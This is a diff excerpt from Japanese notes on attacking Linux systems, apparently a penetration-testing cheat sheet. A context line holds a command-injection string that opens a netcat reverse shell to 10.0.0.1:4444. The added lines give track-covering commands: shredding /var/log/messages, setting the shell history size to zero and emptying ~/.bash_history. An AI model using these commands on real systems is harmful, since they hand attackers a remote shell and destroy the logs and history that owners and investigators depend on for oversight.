@@ -352,3 +352,19 @@ AB; nc 10.0.0.1 4444 -e /bin/bash
 | /var/log/lastlog  | ユーザ最終ログイン     | lastlog      |
 | /var/faillog      | ユーザログイン失敗回数 | faillog      |
 | /var/log/tallylog | ユーザログイン失敗回数 | pam_tally2   |
+
+```bash
+# 乱暴な消し方（3回ランダム情報で上書き）
+shred -n 3 -zu /var/log/messages
+# -n: ランダム情報を書き込む回数
+# -z: 最後に0を書き込む
+# -u: ファイルを削除する
+
+# ファイルの中身だけクリアする
+# 履歴記録上限を0に変更する
+echo $HISTSIZE
+export HISTSIZE=0
+echo $HISTSIZE
+# 履歴をクリア
+> ~/.bash_history
+```
